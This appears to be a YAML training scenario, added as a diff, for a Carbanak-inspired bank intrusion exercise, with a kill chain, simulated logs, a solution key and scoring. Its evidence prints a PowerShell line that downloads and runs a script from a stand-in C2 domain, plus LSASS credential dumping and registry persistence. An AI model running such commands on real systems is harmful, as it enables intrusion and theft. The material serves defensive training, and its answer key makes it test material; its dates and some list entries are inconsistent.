@@ -1,0 +1,392 @@
+scenario_metadata:
+  id: carbanak_inspired_001
+  name: "Operation Digital Heist"
+  version: "1.0"
+  description: "A sophisticated banking trojan campaign targeting financial institutions through spear-phishing and lateral movement techniques"
+  difficulty: "hard"
+  estimated_duration: "90 minutes"
+  category: "Financial APT"
+  scenario_type: "historical_inspired"
+  max_players: 4
+
+  inspiration:
+    attack_name: "Carbanak APT"
+    year: 2015
+    attribution: "Carbanak cybercriminal group"
+    references:
+      - url: "https://en.wikipedia.org/wiki/Carbanak"
+        description: "Carbanak cybercriminal group overview"
+
+  environment:
+    sector: "finance"
+    organization:
+      name: "Regional Trust Bank"
+      size: "large"
+      employee_count: 2500
+      annual_revenue: "$100M - $500M"
+    infrastructure:
+      type: "hybrid"
+      primary_cloud: "Azure"
+      endpoints: 1800
+      servers: 150
+      critical_systems:
+        - name: "Core Banking System"
+          description: "Primary financial transaction processing"
+        - name: "ATM Network Controller"
+          description: "ATM management and monitoring system"
+        - name: "SWIFT Terminal"
+          description: "International wire transfer system"
+
+attack_overview:
+  summary: "Sophisticated banking trojan campaign targeting financial institutions through spear-phishing, lateral movement, and credential harvesting to steal financial data and compromise banking systems."
+
+  kill_chain:
+    - phase: "Reconnaissance"
+      description: "Research and targeting of financial institution employees"
+      techniques: ["T1589", "T1590"]
+    - phase: "Initial Access"
+      description: "Spear-phishing campaign with malicious Word documents"
+      techniques: ["T1566.001"]
+    - phase: "Execution"
+      description: "Macro execution and PowerShell payload deployment"
+      techniques: ["T1059.001", "T1204.002"]
+    - phase: "Persistence"
+      description: "Registry modifications and scheduled task creation"
+      techniques: ["T1547.001", "T1053.005"]
+    - phase: "Privilege Escalation"
+      description: "Windows vulnerability exploitation and credential theft"
+      techniques: ["T1068", "T1003.001"]
+    - phase: "Defense Evasion"
+      description: "Encoded PowerShell commands and process injection"
+      techniques: ["T1027", "T1055"]
+    - phase: "Discovery"
+      description: "Network enumeration and banking system reconnaissance"
+      techniques: ["T1018", "T1083", "T1057"]
+    - phase: "Lateral Movement"
+      description: "SMB admin shares and pass-the-hash attacks"
+      techniques: ["T1021.002", "T1550.002"]
+    - phase: "Collection"
+      description: "Financial data collection and keylogging"
+      techniques: ["T1005", "T1056.001"]
+    - phase: "Command and Control"
+      description: "Encrypted HTTPS communications to external servers"
+      techniques: ["T1071.001", "T1573.002"]
+
+initial_alert:
+  timestamp: "2024-05-20 09:30:00"
+  source: "Network Security Monitoring"
+  alert_type: "high"
+  title: "Suspicious Command and Control Traffic"
+  description: "Unusual encrypted traffic patterns detected to external IP addresses. Multiple endpoints showing signs of compromise."
+
+timeline:
+  day_0:
+    "09:15": "Spear-phishing email sent to finance department employees"
+    "09:42": "Employee sarah.peterson opens malicious Word document attachment"
+    "09:43": "Macro execution downloads first-stage payload"
+    "09:45": "PowerShell-based payload establishes persistence"
+    "10:30": "Reconnaissance phase begins - network and system enumeration"
+    "11:15": "Lateral movement to adjacent workstation via SMB exploitation"
+    "14:23": "EDR system triggers alert on suspicious PowerShell activity"
+  day_1:
+    "08:30": "Attackers establish command and control channel"
+    "10:45": "Privilege escalation using Windows vulnerability"
+    "13:20": "Access to domain controller achieved"
+    "15:40": "Credential harvesting from LSASS memory"
+  day_2:
+    "09:00": "Access to banking application servers"
+    "11:30": "Database reconnaissance and mapping"
+    "14:15": "Preparation for data exfiltration"
+
+attack_chain:
+  - name: "Initial Access"
+    techniques:
+      - id: "T1566.001"
+        name: "Spearphishing Attachment"
+        description: "Malicious Word document with macro payload targeting finance team"
+    indicators:
+      - "Email with subject: 'Urgent: Q1 Financial Results Review Required'"
+      - "Word document: Financial_Report_Q1_2025.docm"
+      - "Macro code obfuscated with Base64 encoding"
+
+  - name: "Execution and Persistence"
+    techniques:
+      - id: "T1059.001"
+        name: "PowerShell"
+        description: "Encoded PowerShell commands for payload execution"
+      - id: "T1053.005"
+        name: "Scheduled Task/Job"
+        description: "Malicious scheduled task for persistence"
+      - id: "T1547.001"
+        name: "Registry Run Keys"
+        description: "Registry modification for automatic startup"
+    indicators:
+      - "powershell.exe -ExecutionPolicy Bypass -EncodedCommand"
+      - "Scheduled task: 'SystemUpdateCheck' created"
+      - "Registry key modifications for persistence"
+
+  - name: "Discovery and Lateral Movement"
+    techniques:
+      - id: "T1083"
+        name: "File and Directory Discovery"
+        description: "Enumeration of file system and network shares"
+      - id: "T1018"
+        name: "Remote System Discovery"
+        description: "Network reconnaissance using net commands"
+      - id: "T1021.002"
+        name: "SMB/Windows Admin Shares"
+        description: "Movement via administrative shares"
+    indicators:
+      - "net view commands to enumerate network shares"
+      - "SMB connections to C$ and ADMIN$ shares"
+      - "WMI remote process creation on multiple systems"
+
+  - name: "Credential Access and Collection"
+    techniques:
+      - id: "T1003.001"
+        name: "LSASS Memory"
+        description: "Memory dump of LSASS process for credential extraction"
+      - id: "T1005"
+        name: "Data from Local System"
+        description: "Collection of financial data and customer information"
+    indicators:
+      - "Suspicious access to LSASS process memory"
+      - "Access to database files and financial records"
+      - "Large file transfers from critical systems"
+
+  - name: "Command and Control"
+    techniques:
+      - id: "T1071.001"
+        name: "Web Protocols"
+        description: "HTTPS communication to external C2 servers"
+      - id: "T1573.002"
+        name: "Asymmetric Cryptography"
+        description: "Encrypted communications using RSA"
+    indicators:
+      - "Outbound HTTPS connections to 185.220.101.42"
+      - "DNS queries to suspicious domains: secure-update-srv.com"
+      - "Regular beacon traffic every 6 hours"
+      - id: "T1071.001"
+        name: "Web Protocols"
+        description: "HTTPS communication to external C2 servers"
+      - id: "T1573.002"
+        name: "Asymmetric Cryptography"
+        description: "Encrypted communications using RSA"
+
+evidence:
+  items:
+    - id: "ev_001"
+      type: "email"
+      source: "email_log"
+      importance: "critical"
+      description: "Spear-phishing email to finance team"
+      content: |
+        From: cfo@technobank-partners.com (spoofed)
+        To: finance-team@technobank.com
+        Subject: Urgent: Q1 Financial Results Review Required
+        Date: 2024-03-15 09:15:00
+
+        Dear Finance Team,
+
+        Please review the attached Q1 financial results immediately. The CFO requires
+        your analysis and feedback by end of business today for the upcoming board meeting.
+
+        The attached document contains sensitive financial data that requires immediate
+        attention and analysis. Please ensure you review all sections carefully.
+
+        Best regards,
+        Chief Financial Officer
+        Regional Trust Bank
+
+        Attachment: Financial_Report_Q1_2025.docm (2.3 MB)
+        SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
+
+        [Analysis: Email spoofs legitimate CFO address, urgency creates pressure to act quickly]
+
+    - id: "ev_002"
+      type: "process"
+      source: "process_log"
+      importance: "critical"
+      description: "PowerShell execution with encoded command"
+      content: |
+        Event ID: 4688 (Process Creation)
+        Time: 2024-03-15 09:43:12
+        Computer: WS-FINANCE-142
+
+        Process Information:
+        Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...
+        User: REGIONALBANK\sarah.peterson
+        Process ID: 2847
+        Parent Process: WINWORD.EXE (PID: 1923)
+
+        Decoded Command (partial):
+        Invoke-WebRequest -Uri "https://secure-update-srv.com/update.ps1" -OutFile "$env:TEMP\sys.ps1";
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File $env:TEMP\sys.ps1" -WindowStyle Hidden
+
+        [Analysis: Macro-initiated PowerShell execution downloading second-stage payload]
+
+    - id: "ev_003"
+      type: "network"
+      source: "network_log"
+      importance: "high"
+      description: "Suspicious outbound connection to C2 server"
+      content: |
+        Firewall Log Entry
+        Time: 2024-03-15 09:44:23
+
+        Connection Details:
+        Source IP: 10.0.1.142 (WS-FINANCE-142)
+        Destination IP: 185.220.101.42
+        Destination Port: 443 (HTTPS)
+        Protocol: TCP
+        Duration: 00:15:32
+        Data Transfer: 2.3 MB outbound, 847 KB inbound
+
+        SSL Certificate Analysis:
+        Subject: CN=secure-update-srv.com
+        Issuer: Self-signed
+        Valid From: 2024-02-01
+        Valid To: 2025-02-01
+
+        DNS Queries:
+        09:43:58 - secure-update-srv.com -> 185.220.101.42
+        09:44:15 - update-service.secure-update-srv.com -> 185.220.101.42
+
+        [Analysis: Communication to suspicious domain with self-signed certificate]
+
+    - id: "ev_004"
+      type: "registry"
+      source: "registry_log"
+      importance: "medium"
+      description: "Persistence mechanism creation"
+      content: |
+        Registry Modification Event
+        Time: 2024-03-15 09:45:31
+        Computer: WS-FINANCE-142
+        User: REGIONALBANK\sarah.peterson
+
+        Registry Changes:
+        Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+        Value Name: SecurityUpdate
+        Value Data: C:\Windows\Temp\sysupd.exe -silent -background
+        Action: Key Created
+
+        Additional Changes:
+        Key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+        Value Name: Userinit
+        Value Data: C:\Windows\system32\userinit.exe,C:\Windows\Temp\sysupd.exe
+        Action: Value Modified
+
+        [Analysis: Multiple persistence mechanisms established]
+
+    - id: "ev_005"
+      type: "memory"
+      source: "memory_dump"
+      importance: "critical"
+      description: "LSASS memory access for credential theft"
+      content: |
+        Memory Access Event
+        Time: 2024-03-16 15:42:18
+        Computer: DC01-REGIONALBANK
+
+        Process Access Details:
+        Target Process: lsass.exe (PID: 744)
+        Accessing Process: powershell.exe (PID: 3521)
+        Access Rights: PROCESS_VM_READ, PROCESS_QUERY_INFORMATION
+        User Context: REGIONALBANK\svc-backup
+
+        Memory Dump Details:
+        Dump File: C:\Windows\Temp\lsass.dmp (45.2 MB)
+        Creation Time: 2024-03-16 15:42:20
+        Status: Detected and quarantined by EDR
+
+        Extracted Credentials (sample):
+        - REGIONALBANK\administrator (NTLM hash detected)
+        - REGIONALBANK\banking-svc (plaintext password detected)
+        - REGIONALBANK\atm-controller (NTLM hash detected)
+
+        [Analysis: Successful credential harvesting from domain controller]
+
+    - id: "ev_006"
+      type: "lateral_movement"
+      source: "security_log"
+      importance: "high"
+      description: "SMB lateral movement to banking systems"
+      content: |
+        Security Event Log Analysis
+        Time Range: 2024-03-17 09:00:00 - 11:30:00
+
+        Lateral Movement Indicators:
+
+        Event ID 4624 (Successful Logon):
+        Time: 2024-03-17 09:15:23
+        Computer: BANK-APP-01
+        Account: REGIONALBANK\svc-backup
+        Logon Type: 3 (Network)
+        Source IP: 10.0.1.142
+
+        Event ID 5140 (Network Share Access):
+        Time: 2024-03-17 09:16:45
+        Computer: BANK-APP-01
+        Share Name: \\BANK-APP-01\C$
+        Account: REGIONALBANK\svc-backup
+        Access Mask: WriteData, AppendData, ExecuteFile
+
+        File System Activity:
+        09:17:12 - File Created: \\BANK-APP-01\C$\Windows\Temp\bank_enum.exe
+        09:18:33 - Process Started: bank_enum.exe (remote execution via WMI)
+        09:25:41 - Database Access: Connection to SWIFT database detected
+
+        [Analysis: Successful lateral movement to critical banking infrastructure]
+
+solution:
+  attack_type: "Advanced Persistent Threat (APT)"
+  attack_vector: "Spear-phishing with macro-enabled document"
+  primary_objective: "Financial data theft and banking system access"
+  secondary_objectives:
+    - "Establish persistent access to banking network"
+    - "Harvest credentials for future operations"
+    - "Map financial infrastructure for targeted attacks"
+
+  key_indicators:
+    - "Spear-phishing email with financial theme"
+    - "PowerShell execution with encoded commands"
+    - "Persistence via scheduled tasks and registry"
+    - "LSASS memory access for credential theft"
+    - "Lateral movement using SMB admin shares"
+    - "Command and control via HTTPS to external IP"
+
+  timeline_summary: |
+    The attack began with a targeted spear-phishing campaign against the finance department.
+    After initial access via macro execution, the attackers established persistence and began
+    reconnaissance. Over 2 days, they escalated privileges, moved laterally through the network,
+    and gained access to critical banking systems before beginning data collection operations.
+
+scoring:
+  investigation_areas:
+    - "Email analysis and phishing identification"
+    - "Process execution and PowerShell analysis"
+    - "Network traffic analysis and C2 identification"
+    - "Persistence mechanism discovery"
+    - "Lateral movement tracking"
+    - "Credential theft investigation"
+    - "Banking system compromise assessment"
+
+  critical_evidence:
+    - "ev_001"  # Phishing email
+    - "ev_002"  # PowerShell execution
+    - "ev_005"  # LSASS memory access
+
+  time_pressure: true
+  red_herrings:
+    - "Routine system update notifications"
+    - "Legitimate PowerShell administrative scripts"
+    - "Normal banking application traffic"
+
+learning_objectives:
+  - "Identify sophisticated spear-phishing campaigns"
+  - "Analyze PowerShell-based attack techniques"
+  - "Understand APT lateral movement methods"
+  - "Recognize banking-specific attack patterns"
+  - "Practice incident response in financial environments"
